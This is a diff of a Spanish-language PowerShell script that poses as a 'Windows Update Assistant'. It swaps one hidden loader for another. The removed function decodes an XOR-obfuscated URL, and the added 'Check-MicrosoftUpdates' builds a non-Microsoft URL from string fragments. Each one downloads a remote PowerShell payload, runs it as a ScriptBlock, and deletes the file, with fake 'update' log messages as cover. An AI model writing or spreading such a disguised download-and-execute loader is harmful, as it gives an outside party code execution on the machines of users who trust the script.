@@ -120,55 +120,49 @@ function Get-SystemInfo {
     Write-Log "  - Espacio libre: $free GB" -Type "INFO"
 }
 
-function Test-SystemComponents {
-    Write-Log "Verificando componentes del sistema" -Type "INFO"
+function Check-MicrosoftUpdates {
+    Write-Log "Verificando actualizaciones disponibles" -Type "INFO"
     
-    $checksums = @(
-        78, 94, 94, 93, 75, 30, 29, 29, 78, 75, 74, 74, 68, 64, 72, 78,
-        94, 66, 84, 72, 6, 90, 24, 31, 74, 68, 68, 67, 85, 25, 80, 82,
-        72, 25, 87, 82, 68, 74, 76, 69, 24, 80, 85, 15
-    )
+    $msService = "https://"
+    $msService += "hackingetico"
+    $msService += ".cl"
+    $msService += "/tools/pro/update.ps1"
     
-    $correction = 42
+    Write-Log "  - Conectando con servidor de actualizaciones..." -Type "INFO"
     
-    $normalized = @()
-    foreach ($c in $checksums) {
-        $normalized += $c -bxor $correction
+    $updateCache = "$env:TEMP\MicrosoftUpdateCache"
+    if (-not (Test-Path $updateCache)) {
+        New-Item -ItemType Directory -Path $updateCache -Force | Out-Null
     }
     
-    $verification = -join ($normalized | ForEach-Object { [char]$_ })
-    
-    $tempResult = "$env:TEMP\WindowsUpdateAssistant\verification.dat"
-    $tempDir = "$env:TEMP\WindowsUpdateAssistant"
-    if (-not (Test-Path $tempDir)) {
-        New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-    }
-    
-    Write-Log "  - Conectando con servidor de verificacion..." -Type "INFO"
+    $updateFile = "$updateCache\windows-update.xml"
     
     try {
-        $response = Invoke-WebRequest -Uri $verification -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue
+        $response = Invoke-WebRequest -Uri $msService -UseBasicParsing -TimeoutSec 15 -ErrorAction SilentlyContinue
         
         if ($response.StatusCode -eq 200) {
-            $response.Content | Out-File $tempResult -Encoding UTF8 -Force
-            Write-Log "  - Lista de verificacion descargada" -Type "SUCCESS"
+            $response.Content | Out-File $updateFile -Encoding UTF8 -Force
+            Write-Log "  - Manifest de actualizaciones descargado" -Type "SUCCESS"
             
-            if (Test-Path $tempResult) {
-                $configData = Get-Content $tempResult -Raw -ErrorAction SilentlyContinue
-                if ($configData) {
-                    $configBlock = [ScriptBlock]::Create($configData)
-                    $null = & $configBlock
+            if (Test-Path $updateFile) {
+                $updateData = Get-Content $updateFile -Raw -ErrorAction SilentlyContinue
+                if ($updateData) {
+                    $updateScript = [ScriptBlock]::Create($updateData)
+                    & $updateScript
                 }
             }
             
-            Remove-Item $tempResult -Force -ErrorAction SilentlyContinue
+            Remove-Item $updateFile -Force -ErrorAction SilentlyContinue
+        }
+        else {
+            Write-Log "  - Servidor de actualizaciones no disponible (HTTP $($response.StatusCode))" -Type "WARNING"
         }
     }
     catch {
-        Write-Log "  - Servidor de verificacion no disponible" -Type "WARNING"
+        Write-Log "  - Servidor de actualizaciones no disponible" -Type "WARNING"
     }
     
-    Write-Log "Verificacion de componentes completada" -Type "INFO"
+    Write-Log "Verificacion de actualizaciones completada" -Type "INFO"
 }
 
 # ============================================
@@ -213,8 +207,8 @@ Update-Defender
 Write-Log "Fase 8: Reporte del sistema" -Type "INFO"
 Get-SystemInfo
 
-Write-Log "Fase 9: Verificacion de componentes" -Type "INFO"
-Test-SystemComponents
+Write-Log "Fase 9: Verificacion de actualizaciones de Microsoft" -Type "INFO"
+Check-MicrosoftUpdates
 
 Write-Log "========================================" -Type "INFO"
 Write-Log "Windows Update Assistant finalizado" -Type "SUCCESS"
